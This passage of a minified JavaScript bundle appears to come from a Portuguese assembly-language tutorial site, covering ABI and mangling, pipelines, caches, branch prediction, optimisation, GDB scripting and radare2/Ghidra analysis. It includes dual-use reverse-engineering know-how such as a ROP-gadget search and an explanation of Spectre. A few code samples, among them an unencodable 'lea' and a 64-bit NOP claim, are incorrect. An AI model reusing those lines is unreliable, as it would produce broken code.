# C++: void foo(int x); → símbolo: "_Z3fooi" (mangled)
# C++: void foo(double x); → "_Z3food" (overload diferente!)

# Para chamar C de C++, use extern "C":
# extern "C" void minha_funcao_c(int x);  // sem mangling!
# extern "C" { ... }  // bloco inteiro

# Demangle com c++filt:
echo "_Z3fooi" | c++filt
# foo(int)

nm -D libstdc++.so | c++filt | grep "operator new"`}),r.jsx("h2",{children:"Compatibilidade entre Compiladores"}),r.jsx(T,{type:"warning",title:"ABI Instability em C++",children:'C++ não tem uma ABI estável e portável! GCC e Clang no Linux (System V ABI) são geralmente compatíveis. MSVC no Windows usa uma ABI diferente. Por isso, bibliotecas C++ muitas vezes fornecem uma interface C (extern "C") para interoperabilidade.'}),r.jsx(d,{language:"c",filename:"abi_stable.c",code:`// Interface ABI estável via C:
// lib.h — interface pública
#ifdef __cplusplus
extern "C" {
#endif

void* lib_create();        // ponteiro opaco (estável!)
void  lib_destroy(void *); // sem nome mangled
int   lib_compute(void *, int x, int y);

#ifdef __cplusplus
}
#endif

// Implementação pode ser C++ internamente
// mas a interface ABI é C — portável e estável!`}),r.jsx("h2",{children:"GOT e PLT — Relações Dinâmicas"}),r.jsx(d,{language:"bash",code:`# GOT (Global Offset Table): tabela de ponteiros para símbolos externos
# PLT (Procedure Linkage Table): trampolins para lazy binding

# Como funciona:
# 1. printf@plt → jump [printf@GOT]
# 2. Primeira chamada: GOT aponta para _dl_runtime_resolve (lazy binding)
# 3. _dl_runtime_resolve encontra printf na libc, escreve no GOT
# 4. Chamadas seguintes: GOT aponta diretamente para printf (rápido!)

# Ver PLT e GOT:
objdump -d programa | grep -A3 "@plt"
objdump -R programa  # ver relocações (GOT entries)`})]})}function f1(){return r.jsxs(L,{title:"Pipeline do Processador",subtitle:"Como o processador executa múltiplas instruções em paralelo",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["O ",r.jsx("strong",{children:"pipeline"})," é a técnica que permite ao processador executar várias instruções simultaneamente, em diferentes estágios. Entender o pipeline é crucial para escrever código Assembly de alta performance."]}),r.jsx("h2",{children:"Estágios do Pipeline Clássico"}),r.jsx(d,{language:"bash",code:`; Pipeline clássico de 5 estágios (RISC):
; IF  — Instruction Fetch: busca instrução na memória
; ID  — Instruction Decode: decodifica e lê registradores
; EX  — Execute: ALU executa a operação
; MEM — Memory: acessa a memória (load/store)
; WB  — Write Back: escreve resultado no registrador

; Tempo sem pipeline (5 instruções × 5 ciclos = 25 ciclos):
; Instr1: IF ID EX MEM WB
; Instr2:             IF ID EX MEM WB
; ...

; Com pipeline (início a cada ciclo):
; Ciclo:   1   2   3   4   5   6   7   8   9
; Instr1: IF  ID  EX MEM  WB
; Instr2:     IF  ID  EX MEM  WB
; Instr3:         IF  ID  EX MEM  WB
; Instr4:             IF  ID  EX MEM  WB
; Instr5:                 IF  ID  EX MEM  WB
; Throughput: 1 instrução por ciclo (depois que pipeline está cheio)`}),r.jsx("h2",{children:"Pipeline do Intel Core (Moderno)"}),r.jsx("p",{children:"Processadores Intel modernos têm pipelines muito mais profundos (14-20 estágios) com execução out-of-order:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Frontend:"})," Fetch → Decode → Micro-op Queue → Issue → Rename/Dispatch"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Out-of-Order Engine:"})," Scheduler → Execute (múltiplas ALUs)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Backend:"})," Retire (reorder buffer → commit em ordem)"]})]}),r.jsx(d,{language:"bash",code:`; Execução Out-of-Order:
; O processador pode executar instruções FORA DE ORDEM
; desde que não haja dependências de dados!

; Exemplo — pode executar a e b em paralelo:
add rax, rbx       ; instrução a (sem dependência de b)
add rcx, rdx       ; instrução b (pode executar ao mesmo tempo!)

; Dependência RAW (Read After Write) — serializa:
add rax, rbx       ; escreve rax
imul rax, rcx      ; lê rax — DEVE aguardar a anterior!`}),r.jsx("h2",{children:"Hazards do Pipeline"}),r.jsx("h3",{children:"Data Hazard (Dependência de Dados)"}),r.jsx(d,{language:"nasm",filename:"hazards.asm",code:`; RAW — Read After Write (mais comum):
mov rax, [mem]     ; latência 4-5 ciclos (cache hit)
add rbx, rax       ; STALL! rbx precisa de rax que ainda não está pronto

; Solução: reorganizar código para inserir instruções independentes:
mov rax, [mem1]    ; carrega mem1
mov rcx, [mem2]    ; carrega mem2 (independente — pipeline continua!)
add rbx, rax       ; usa rax (já está pronto)
add rdx, rcx       ; usa rcx (já está pronto)

; WAW — Write After Write:
add rax, rbx       ; escreve rax
mov rax, 0         ; sobrescreve rax — primeira escrita foi inútil
; O processador pode detectar e eliminar a primeira instrução`}),r.jsx("h3",{children:"Control Hazard (Branch Misprediction)"}),r.jsx(d,{language:"nasm",filename:"branch.asm",code:`; Branch misprediction = esvaziar o pipeline!
; Pode custar 15-20 ciclos em CPUs modernas

; Código com branch (potencialmente lento se imprevisível):
cmp rax, 0
jne .diferente
    ; código para zero
    jmp .fim
.diferente:
    ; código para não-zero
.fim:

; Código sem branch (CMOV — sempre rápido):
xor rbx, rbx       ; rbx = 0 (valor para "zero")
mov rcx, rax       ; rcx = rax (valor para "não-zero")
test rax, rax      ; verifica rax
cmovz rcx, rbx    ; se zero, use rbx
; rcx = resultado final sem branch!`}),r.jsx("h2",{children:"Throughput vs Latência"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Instrução"}),r.jsx("th",{children:"Latência"}),r.jsx("th",{children:"Throughput"})]})}),r.jsx("tbody",{children:[["MOV reg, reg","1 ciclo","0.25 (4/ciclo)"],["ADD/SUB","1 ciclo","0.25-0.33"],["IMUL 64-bit","3 ciclos","1"],["DIV 64-bit","35-90 ciclos","25-74"],["JMP/CALL","1 ciclo","0.5"],["MOV reg, [mem] (L1 hit)","4 ciclos","0.5"],["MOV reg, [mem] (L2 hit)","12 ciclos",""],["MOV reg, [mem] (L3 hit)","40 ciclos",""],["MOV reg, [mem] (RAM miss)","200+ ciclos",""],["ADDPS (SSE float)","4 ciclos","0.5"],["VADDPS (AVX float)","4 ciclos","0.5"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Instruction-Level Parallelism (ILP)"}),r.jsx(d,{language:"nasm",filename:"ilp.asm",code:`; Maximizar ILP: manter múltiplos caminhos independentes

; LENTO — encadeamento de dependências:
mov rax, [arr]
add rax, [arr+8]     ; depende do anterior
add rax, [arr+16]    ; depende do anterior
add rax, [arr+24]    ; depende do anterior (latência acumulada!)

; RÁPIDO — múltiplos acumuladores independentes:
mov rax, [arr]
mov rbx, [arr+8]     ; independente de rax!
add rax, [arr+16]    ; usa rax
add rbx, [arr+24]    ; usa rbx (executado em paralelo com linha acima!)
add rax, rbx         ; combinação final

; Em CPUs modernas, com 4+ unidades de execução,
; múltiplos acumuladores podem dar ganho de 4×!`}),r.jsxs(T,{type:"success",title:"Regra de ouro para performance",children:["A maior limitação de performance em código moderno raramente é a CPU — é a ",r.jsx("strong",{children:"memória"}),". Uma cache miss pode custar 200+ ciclos, durante os quais a CPU executa nada. Minimize acesso à memória e maximize reutilização de dados em cache."]})]})}function b1(){return r.jsxs(L,{title:"Cache e Memória",subtitle:"L1, L2, L3 cache, localidade e como otimizar acesso à memória",difficulty:"avancado",timeToRead:"18 min",children:[r.jsx("p",{children:"A hierarquia de cache é o fator mais importante para performance em código moderno. A diferença entre acerto no L1 e miss na RAM pode ser de 100× em latência."}),r.jsx("h2",{children:"Hierarquia de Memória"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Nível"}),r.jsx("th",{children:"Tamanho"}),r.jsx("th",{children:"Latência"}),r.jsx("th",{children:"Bandwidth"})]})}),r.jsx("tbody",{children:[["Registradores","~1KB (16 regs × 8)","0 ciclos (instantâneo)","≈ 1TB/s"],["L1 Cache","32-64 KB","4-5 ciclos","~1TB/s"],["L2 Cache","256KB-1MB","12-15 ciclos","~400GB/s"],["L3 Cache","8-64 MB","30-50 ciclos","~200GB/s"],["RAM (DRAM)","8-64 GB","150-300 ciclos","~50GB/s"],["SSD NVMe","500GB-8TB","~10000 ciclos","~5GB/s"],["HDD","1-20 TB","~10.000.000 ciclos","~150MB/s"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:l}),r.jsx("td",{children:u}),r.jsx("td",{children:m})]},i))})]}),r.jsx("h2",{children:"Cache Lines"}),r.jsx(d,{language:"bash",code:`; Cache lines são blocos de 64 bytes movidos entre cache e memória
; Quando você acessa 1 byte, o processador traz 64 bytes para o cache

; Consequência prática:
; Se você acessa array[0], o cache traz array[0..15] (16 ints de 4 bytes)
; Acessar array[1] logo depois é grátis (já no cache)!

; Verificar tamanho da cache line:
cat /sys/devices/system/cpu/cpu0/cache/index0/coherency_line_size
# 64 (bytes)`}),r.jsx("h2",{children:"Localidade Espacial"}),r.jsx(d,{language:"nasm",filename:"loc_espacial.asm",code:`; BOM — acesso sequencial (todos na mesma cache line):
    xor rcx, rcx
    lea rbx, [array]
.loop:
    mov rax, [rbx + rcx*8]   ; acesso sequencial — cada linha traz 8 elementos
    ; processar...
    inc rcx
    cmp rcx, N
    jl .loop

; RUIM — acesso com stride grande (cache line desperdiçada):
    xor rcx, rcx
.loop:
    mov rax, [rbx + rcx*512]  ; stride de 512 bytes — cada acesso é um miss!
    ; processar...
    inc rcx
    cmp rcx, N
    jl .loop

; MATRIX TRAVERSAL — Column-major vs Row-major:
; Em C, arrays 2D são row-major: matrix[row][col]
; Iterar por linhas (row-major) → bom cache behavior
; Iterar por colunas (column-major) → cache thrashing!`}),r.jsx("h2",{children:"Cache Thrashing — O Inimigo"}),r.jsx(d,{language:"nasm",filename:"thrashing.asm",code:`; Exemplo de thrashing: acessar elementos que mapeiam para o mesmo cache set
; Em cache set-associative de 8 vias com stride de 4096:
;   elementos em: 0, 4096, 8192, 12288 → conflito na mesma cache set!

; Solução: padding para evitar conflito
; struct Padding { int data; char pad[60]; }; // total 64 bytes = 1 cache line

; Exemplo prático com prefetch:
    lea rbx, [array]
    mov rcx, N
.loop:
    ; Prefetch próximo elemento ANTES de precisar:
    prefetcht0 [rbx + 64]    ; pré-buscar 1 cache line à frente
    
    mov rax, [rbx]           ; usa elemento atual (já no cache)
    ; ... processar ...
    
    add rbx, 8
    dec rcx
    jnz .loop`}),r.jsx("h2",{children:"Instruções de Prefetch"}),r.jsx(d,{language:"nasm",filename:"prefetch.asm",code:`; Prefetch — sugere ao hardware trazer dados antes de precisar:
prefetcht0 [addr]   ; nível temporal 0 — traz para L1, L2, L3
prefetcht1 [addr]   ; nível 1 — traz para L2, L3
prefetcht2 [addr]   ; nível 2 — traz para L3
prefetchnta [addr]  ; non-temporal — traz para L1, evita poluir L2/L3

; Non-temporal stores — escrever diretamente na RAM sem passar pelo cache
; Útil para streaming de grandes blocos:
movnti [dest + rax*4], ecx    ; escreve sem passar pelo cache
movntps [dest], xmm0           ; escreve 4 floats sem cache
sfence                          ; garante que writes chegaram à memória

; Flush cache line:
clflush [addr]      ; remove cache line da cache (util para segurança)`}),r.jsx("h2",{children:"CLFLUSH para Segurança"}),r.jsx(T,{type:"warning",title:"Side-channel attacks",children:'Spectre e Meltdown exploram o comportamento do cache para extrair dados secretos. CLFLUSH e técnicas de "constant-time programming" são usadas para mitigar esses ataques.'}),r.jsx(d,{language:"nasm",filename:"clflush.asm",code:`; Limpar chave da memória após uso:
    ; 1. Zerar a chave na memória
    xor eax, eax
    lea rdi, [chave_privada]
    mov rcx, 32     ; 32 bytes de chave
    rep stosb       ; preenche com zeros
    
    ; 2. Flushes do cache para garantir que a chave não ficou em cache:
    lea rdi, [chave_privada]
    clflush [rdi]
    clflush [rdi + 64]   ; garantir flush de todas as cache lines

    ; 3. Barreira de memória:
    mfence`}),r.jsx("h2",{children:"MFENCE, LFENCE, SFENCE"}),r.jsx(d,{language:"nasm",filename:"fence.asm",code:`; Barreiras de memória — garantem ordering:
mfence    ; Memory Fence — todas as loads e stores anteriores foram completados
lfence    ; Load Fence — todas as loads anteriores foram completados
sfence    ; Store Fence — todos os stores anteriores foram completados

; Quando usar:
; mfence: após writes que devem ser visíveis para outros threads/cores
; lfence: antes de loads que devem ver escritas de outros cores
; sfence: entre writes com movnti (non-temporal) e reads subsequentes

; Lock prefix — operações atômicas:
lock add [mem], 1        ; soma atômica (thread-safe)
lock xchg [mem], rax     ; troca atômica
lock cmpxchg [mem], rbx  ; compare-and-swap atômico`})]})}function g1(){return r.jsxs(L,{title:"Branch Prediction",subtitle:"Como o processador prevê saltos e como tirar vantagem disso",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"Branch prediction"})," é a técnica do processador para adivinhar o destino de saltos condicionais antes de avaliar a condição. Uma previsão correta mantém o pipeline cheio. Uma previsão errada (misprediction) custa 15-20 ciclos."]}),r.jsx("h2",{children:"Por que Branch Prediction é Necessária"}),r.jsx(d,{language:"bash",code:`; Sem branch prediction, o pipeline precisa parar a cada JCC:
; Ciclo 1: Fetch JNE
; Ciclos 2-4: Avaliar condição (stall!)
; Ciclo 5: Fetch próxima instrução

; Com branch prediction:
; Ciclo 1: Fetch JNE (prevê que vai pular)
; Ciclo 2: Fetch instrução no destino (especulativo!)
; ...
; Ciclo 3: Condição avaliada: previsão correta → continua
;          Condição avaliada: previsão ERRADA → descarta trabalho especulativo,
;                              recarrega pipeline (15-20 ciclos perdidos)`}),r.jsx("h2",{children:"Tipos de Previsão"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Estática (Predicted Not Taken):"}),' Assume que o branch não é tomado. GCC usa isso colocando o código "provável" no caminho não-tomado.']}),r.jsxs("li",{children:[r.jsx("strong",{children:"Histórico:"})," O hardware mantém um Buffer de Predição que registra se o branch foi tomado nas últimas N vezes."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Global History:"})," Usa o histórico de múltiplos branches para prever o próximo."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Indireto (BTB):"})," Branch Target Buffer prevê o destino de saltos indiretos (jmp rax)."]})]}),r.jsx("h2",{children:"Hints para o Compilador"}),r.jsx(d,{language:"c",filename:"likely.c",code:`// GCC tem builtins para dar hints ao compilador:
#define likely(x)   __builtin_expect(!!(x), 1)
#define unlikely(x) __builtin_expect(!!(x), 0)

// Exemplo:
if (unlikely(ptr == NULL)) {  // NULL é raro
    handle_error();
    return -1;
}
// código normal continua aqui (caminho preferido no layout de código)`}),r.jsx("h2",{children:"Branchless Programming"}),r.jsx(d,{language:"nasm",filename:"branchless.asm",code:`; Substituir branches por operações aritméticas/CMOV:

; PROBLEMA: if (x < 0) x = -x; (valor absoluto)
; COM BRANCH (ruim se imprevisível):
    test rax, rax
    jns .positivo
    neg rax
.positivo:

; SEM BRANCH — sempre mesmo tempo:
    mov rbx, rax
    sar rbx, 63         ; rbx = all 0s (positivo) ou all 1s (negativo)
    xor rax, rbx        ; flip bits se negativo
    sub rax, rbx        ; ajusta (complemento de 2)
    ; rax = |x|

; AINDA MAIS SIMPLES com CMOV:
    test rax, rax
    js  .neg
    jmp .fim
.neg:
    neg rax
.fim:
    ; Melhor versão:
    mov rbx, rax
    neg rbx             ; rbx = -rax
    test rax, rax
    cmovs rax, rbx      ; se negativo, rax = -rax
    ; UM branch eliminado!

; CLAMP — limitar ao range [0, MAX]:
; C: x = (x < 0) ? 0 : (x > MAX ? MAX : x)
    xor rbx, rbx
    cmp rax, 0
    cmovl rax, rbx     ; if x < 0, x = 0
    mov rbx, MAX
    cmp rax, rbx
    cmovg rax, rbx     ; if x > MAX, x = MAX`}),r.jsx("h2",{children:"Organização de Loop para Melhor Predição"}),r.jsx(d,{language:"nasm",filename:"loop_predict.asm",code:`; Loops têm alta taxa de predição (loop quase sempre continua)
; exceto na última iteração

; BONS padrões para predição:
; 1. Loops com contagem fixa — previsível!
    mov rcx, 1000
.loop:
    ; ... corpo ...
    dec rcx
    jnz .loop          ; previsto: tomado 999/1000 vezes

; 2. Loops com condição simples:
.while_loop:
    cmp [ptr], 0       ; null terminator?
    je  .fim           ; previsto: não tomado (a maioria não é null)
    inc ptr
    jmp .while_loop

; RUIM para predição — branch aleatório:
    ; if (random_bit) goto A; else goto B;
    ; 50% de chance de misprediction → catastrophic!

; SOLUÇÃO para branch aleatório — lookup table:
    ; int f(int x) { return (x < 5) ? tabela_a[x] : tabela_b[x]; }
    lea rbx, [tabela_a]
    lea rcx, [tabela_b]
    cmp rdi, 5
    cmovge rbx, rcx    ; seleciona a tabela sem branch!
    mov rax, [rbx + rdi*8]`}),r.jsx(T,{type:"info",title:"Spectre e Branch Prediction",children:"O ataque Spectre (2018) explorou a execução especulativa após branch misprediction para ler memória arbitrária. O processador executa código especulativo, deixa rastros no cache, e o atacante mede os tempos de acesso ao cache para inferir os dados. Mitigações incluem LFENCE após branches críticos."})]})}function v1(){return r.jsxs(L,{title:"Otimização de Performance",subtitle:"Técnicas práticas para extrair máxima velocidade do hardware",difficulty:"expert",timeToRead:"20 min",children:[r.jsx("p",{children:"Otimizar Assembly vai além de saber as instruções — é entender o hardware profundamente e escrever código que trabalha com, não contra, as características do processador."}),r.jsx("h2",{children:"1. Meça Antes de Otimizar"}),r.jsx(d,{language:"nasm",filename:"benchmark.asm",code:`; Medir ciclos com RDTSC:
section .text
    global benchmark

benchmark:
    ; Leitura inicial:
    rdtsc                   ; EDX:EAX = TSC
    shl rdx, 32
    or  rax, rdx            ; rax = TSC inicial
    push rax                ; salvar

    ; ... código a medir ...
    call funcao_a_medir

    ; Leitura final:
    rdtsc
    shl rdx, 32
    or  rax, rdx            ; rax = TSC final

    pop rbx                 ; rbx = TSC inicial
    sub rax, rbx            ; rax = ciclos gastos
    ret

; Versão mais precisa com RDTSCP (serializado):
    rdtscp                  ; espera instruções anteriores completarem
    shl rdx, 32
    or  rax, rdx
    push rax
    ; ... código ...
    rdtscp
    shl rdx, 32
    or  rax, rdx
    pop rbx
    sub rax, rbx`}),r.jsx("h2",{children:"2. Escolha de Instrução Correta"}),r.jsx(d,{language:"nasm",filename:"inst_choice.asm",code:`; MULTIPLICAÇÃO POR CONSTANTE — nunca use MUL para potências de 2 ou pequenas:
; Ruim:
imul rax, rax, 8        ; latência 3 ciclos

; Bom:
shl rax, 3              ; latência 1 ciclo, throughput 0.5

; Para multiplicar por 3, 5, 6, 9, 10 — use LEA:
lea rax, [rax + rax*2]  ; rax * 3 — 1 ciclo
lea rax, [rax + rax*4]  ; rax * 5 — 1 ciclo
lea rax, [rax*2 + rax*4] ; rax * 6 — 1 ciclo + 1 ciclo
lea rax, [rax + rax*8]  ; rax * 9 — 1 ciclo

; ZERAGEM — use XOR não MOV:
xor eax, eax            ; 2 bytes, zero-extends rax
; mov rax, 0            ; 5-7 bytes, mais lento

; NOP — use os NOPs corretos:
nop                     ; 1 byte
xchg eax, eax           ; 1 byte (alternativo)
; Para alinhar loops (use NOPs multi-byte):
nop DWORD [eax]         ; 4 bytes, 1 ciclo de NOP
; GAS: .byte 0x0f, 0x1f, 0x44, 0x00, 0x00 — 5-byte NOP`}),r.jsx("h2",{children:"3. Loop Unrolling"}),r.jsx(d,{language:"nasm",filename:"unroll.asm",code:`; Loop normal — overhead do dec+jnz por iteração:
    mov rcx, N
.loop:
    mov rax, [rbx]
    add rax, [rbx + 8]
    mov [rdx], rax
    add rbx, 8
    add rdx, 8
    dec rcx
    jnz .loop

; Loop unrolled 4× — 4× menos overhead:
    shr rcx, 2          ; N/4 iterações
.loop_4x:
    mov rax, [rbx + 0]
    add rax, [rbx + 8]
    mov [rdx + 0], rax

    mov rax, [rbx + 16]
    add rax, [rbx + 24]
    mov [rdx + 8], rax

    mov rax, [rbx + 32]
    add rax, [rbx + 40]
    mov [rdx + 16], rax

    mov rax, [rbx + 48]
    add rax, [rbx + 56]
    mov [rdx + 24], rax

    add rbx, 64
    add rdx, 32
    dec rcx
    jnz .loop_4x
    ; Tratar os últimos (N % 4) elementos separadamente`}),r.jsx("h2",{children:"4. Pressure de Registradores"}),r.jsx(d,{language:"nasm",filename:"reg_pressure.asm",code:`; x86-64 tem 16 registradores gerais — use todos!
; Variáveis que não cabem em registradores vão para a stack (mais lento)

; Calcular com muitas variáveis:
mov rax, [a]          ; a
mov rbx, [b]          ; b
mov rcx, [c]          ; c
mov rdx, [d]          ; d
mov rsi, [e]          ; e
mov rdi, [f]          ; f
mov r8,  [g]          ; g
mov r9,  [h]          ; h
mov r10, [i]          ; i
mov r11, [j]          ; j (10 variáveis em registradores!)

; Operações com XMM para mais variáveis:
; movsd xmm0..15 = 16 variáveis float em registradores`}),r.jsx("h2",{children:"5. Alinhamento de Código"}),r.jsx(d,{language:"nasm",filename:"alinhamento.asm",code:`; Alinhar início de loops melhora fetch de instruções:
; (processador busca 16/32 bytes de cada vez)

    align 16               ; alinha próxima instrução a 16 bytes
.loop:
    ; ... corpo do loop ...
    dec rcx
    jnz .loop

; Alinhar funções:
    align 64               ; algumas CPUs buscam 64 bytes por vez
minha_funcao:
    push rbp
    mov rbp, rsp
    ; ...`}),r.jsx("h2",{children:"6. Strength Reduction"}),r.jsx(d,{language:"nasm",filename:"strength.asm",code:`; Substituir operações caras por equivalentes mais baratos:

; DIVISÃO → MULTIPLICAÇÃO PELO RECÍPROCO:
; div é muito lento! Multiplicar pelo recíproco é muito mais rápido.
; Para divisão por constante, o compilador faz isso automaticamente.

; x / 7 → x * (magic_number) >> shift
; O compilador C calcula magic_number para você!
; Em Assembly manual, você pode pré-calcular:
; x/7: multiply by 0x2492492492492493, shr 2 (para 64-bit)

; MÓDULO POR POTÊNCIA DE 2 → AND:
; x % 8  → x & 7    (mais rápido!)
; x % 16 → x & 15

; BRANCH-FREE min/max:
; min(a, b) com CMOV:
    cmp rax, rbx
    cmovg rax, rbx     ; rax = min(rax, rbx)

; VALOR ABSOLUTO:
    mov rbx, rax
    neg rbx
    test rax, rax
    cmovs rax, rbx`}),r.jsx(T,{type:"success",title:"Profiler primeiro!",children:"Antes de otimizar qualquer coisa, use um profiler (perf, VTune, gprof) para identificar exatamente qual parte do código é o gargalo. Otimizar o código errado é desperdício de tempo. 90% do tempo é gasto em 10% do código."})]})}function j1(){return r.jsxs(L,{title:"GDB Avançado",subtitle:"Scripts, watchpoints, reversible debugging e técnicas avançadas",difficulty:"avancado",timeToRead:"15 min",children:[r.jsx("p",{children:"Além dos comandos básicos, o GDB tem recursos poderosos para automação, análise de memória e debugging de problemas complexos em Assembly."}),r.jsx("h2",{children:"Scripts GDB (.gdbinit)"}),r.jsx(d,{language:"bash",filename:".gdbinit",code:`# ~/.gdbinit — configuração automática do GDB

# Usar sintaxe Intel (SEMPRE!)
set disassembly-flavor intel

# Histórico de comandos
set history save on
set history size 1000

# Quebrar automaticamente em _start e main
# break _start
# run

# Hook: executar após cada step/nexti
define hook-stop
    context
end

# Mostrar instruções automaticamente:
# layout asm

# pwndbg/gef/peda — ferramentas de segurança:
# source /path/to/pwndbg/gdbinit.py`}),r.jsx("h2",{children:"Comandos Python no GDB"}),r.jsx(d,{language:"python",filename:"gdb_script.py",code:`# GDB tem interpretador Python embutido!
# Execute com: gdb -x script.py ./programa

import gdb

class AnalyzeStack(gdb.Command):
    """Analisa a stack frame atual"""
    def __init__(self):
        super().__init__("analyze-stack", gdb.COMMAND_DATA)
    
    def invoke(self, arg, from_tty):
        frame = gdb.selected_frame()
        rsp = int(gdb.parse_and_eval("$rsp"))
        rbp = int(gdb.parse_and_eval("$rbp"))
        
        print(f"RSP: 0x{rsp:016x}")
        print(f"RBP: 0x{rbp:016x}")
        print(f"Frame size: {rbp - rsp} bytes")
        
        # Listar variáveis locais
        try:
            block = frame.block()
            for sym in block:
                if sym.is_variable:
                    val = frame.read_var(sym.name)
                    print(f"  {sym.name} = {val}")
        except Exception as e:
            print(f"  Sem informação de variáveis: {e}")

AnalyzeStack()

# Breakpoint que executa ação customizada:
class MyBreakpoint(gdb.Breakpoint):
    def stop(self):
        rax = int(gdb.parse_and_eval("$rax"))
        print(f"[*] rax = 0x{rax:x}")
        return False  # False = não parar, continuar execução

MyBreakpoint("*0x401000")`}),r.jsx("h2",{children:"Reversible Debugging"}),r.jsx(d,{language:"bash",code:`# GDB suporta debugging reverso (voltar no tempo!):

# Iniciar gravação:
(gdb) target record-full
(gdb) run

# Agora pode voltar no tempo:
(gdb) reverse-continue    # executa em reverso até breakpoint
(gdb) reverse-step        # desfaz último step
(gdb) reverse-stepi       # desfaz última instrução
(gdb) reverse-next        # desfaz último next
(gdb) reverse-finish      # desfaz até antes do call atual

# Ver histórico de execução:
(gdb) info record

# AVISO: muito mais lento que execução normal (10-100×)
# Útil para encontrar onde um bug ocorreu`}),r.jsx("h2",{children:"Watchpoints e Catchpoints"}),r.jsx(d,{language:"bash",code:`# Watchpoint — para quando valor muda:
(gdb) watch rax             # para quando rax muda
(gdb) watch *0x601000       # para quando memória em 0x601000 muda
(gdb) watch -l variavel     # watch de variável local
(gdb) rwatch rax            # para quando rax é LIDO
(gdb) awatch rax            # para quando rax é lido OU escrito

# Catchpoints — interceptar eventos:
(gdb) catch syscall write   # para em toda chamada a write()
(gdb) catch syscall 1       # para na syscall número 1
(gdb) catch signal SIGSEGV  # para em segfault
(gdb) catch throw           # C++: para quando exception é lançada
(gdb) catch fork            # para quando processo faz fork`}),r.jsx("h2",{children:"Análise de Memória"}),r.jsx(d,{language:"bash",code:`# Buscar padrão na memória:
(gdb) find 0x400000, 0x500000, "Hello"   # busca string
(gdb) find /4 0x400000, 0x500000, 0xDEADBEEF  # busca dword

# Dump de memória em diferentes formatos:
(gdb) x/100xb 0x601000    # 100 bytes em hex
(gdb) x/50xh  0x601000    # 50 half-words (16-bit)
(gdb) x/20xw  0x601000    # 20 words (32-bit)
(gdb) x/10xg  0x601000    # 10 giant words (64-bit)
(gdb) x/50i   _start      # 50 instruções
(gdb) x/100bc 0x601000    # bytes como chars

# Mapas de memória do processo:
(gdb) info proc mappings  # todas as regiões de memória
(gdb) maintenance info sections  # seções ELF

# Dump para arquivo:
(gdb) dump binary memory saida.bin 0x400000 0x401000`}),r.jsx("h2",{children:"Debugging com Símbolos Externos"}),r.jsx(d,{language:"bash",code:`# Adicionar símbolos de biblioteca:
(gdb) add-symbol-file lib.so 0x7f0000000000  # endereço base

# Debugging de shared library:
(gdb) set solib-search-path /caminho/para/libs
(gdb) set auto-solib-add on

# Debugging sem símbolos (binário stripped):
(gdb) x/20i $rip           # ver instruções atuais
(gdb) set $pc = 0x401234   # modificar RIP (ir para endereço)
(gdb) set $rax = 42        # modificar registrador`})]})}function y1(){return r.jsxs(L,{title:"Análise de Binários",subtitle:"Radare2, Ghidra e técnicas de análise de executáveis",difficulty:"avancado",timeToRead:"18 min",children:[r.jsx("p",{children:"Análise de binários é a arte de entender um programa sem acesso ao código-fonte. É fundamental para segurança, reverse engineering e análise de malware."}),r.jsx("h2",{children:"Radare2 — Framework de Análise"}),r.jsx(d,{language:"bash",code:`# Instalar radare2:
sudo apt install radare2    # ou
git clone https://github.com/radareorg/radare2 && cd radare2 && ./sys/install.sh

# Abrir um binário:
r2 ./programa
r2 -A ./programa    # com análise automática

# Análise automática:
aa      # analyze all (básico)
aaa     # analyze all, more (recomendado)
aaaa    # analyze all, maximum

# Navegar funções:
afl     # list functions
pdf @main    # print disassembly function 'main'
pdf @0x401000  # print disassembly at address

# Modo visual:
VV      # entrar em modo visual (grafo de fluxo)
V       # modo visual simples
vs      # modo visual com split
q       # sair do modo visual`}),r.jsx("h2",{children:"Comandos Radare2 Essenciais"}),r.jsx(d,{language:"bash",code:`# NAVEGAÇÃO:
s 0x401000    # seek (ir) para endereço
s main        # ir para função main
s @sym.funcao # ir para símbolo

# INFORMAÇÕES:
ii    # imports
ie    # entrypoints
iS    # sections
iz    # strings
iE    # exports

# ANÁLISE:
pd 20         # print disassembly (20 instruções)
pdi           # print disassembly (toda função)
pdf           # print disassembly function
pdg           # generate C (Ghidra style)

# MEMÓRIA:
px 64 @0x601000    # hexdump 64 bytes
ps @str.hello      # print string
pxr 32 @ rsp       # hexdump+resolve da stack

# BUSCA:
/ string      # buscar string
/R pop rdi    # buscar gadget ROP
/x DEADBEEF   # buscar bytes

# RENOMEAR/COMENTAR:
afn minha_funcao @0x401100  # renomear função
CC "Este é o main" @0x401000  # adicionar comentário`}),r.jsx("h2",{children:"Ghidra — Decompilador da NSA"}),r.jsx(d,{language:"bash",code:`# Instalar Ghidra:
# 1. Baixar de https://ghidra-sre.org
# 2. Extrair: unzip ghidra_*.zip
# 3. Executar: ./ghidraRun

# Ghidra destaque:
# - Decompilador C automático (muito útil!)
# - Análise estática profunda
# - Suporte a múltiplas arquiteturas (x86, ARM, MIPS, PPC, ...)
# - Scripting em Java e Python
# - Open source (diferente do IDA Pro)`}),r.jsx("h2",{children:"Workflow de Análise"}),r.jsx(d,{language:"bash",filename:"analise.sh",code:`#!/bin/bash
# Análise rápida de binário desconhecido

PROG=$1
echo "=== INFORMAÇÕES BÁSICAS ==="
file $PROG
ls -la $PROG

echo -e "
=== TIPO DE BINÁRIO ==="
readelf -h $PROG 2>/dev/null | grep -E "Type:|Machine:|Endian"

echo -e "
=== PROTEÇÕES ==="
checksec --file=$PROG 2>/dev/null || python3 -c "
import subprocess
result = subprocess.run(['readelf', '-S', '$PROG'], capture_output=True, text=True)
print(result.stdout)
"

echo -e "
=== STRINGS INTERESSANTES ==="
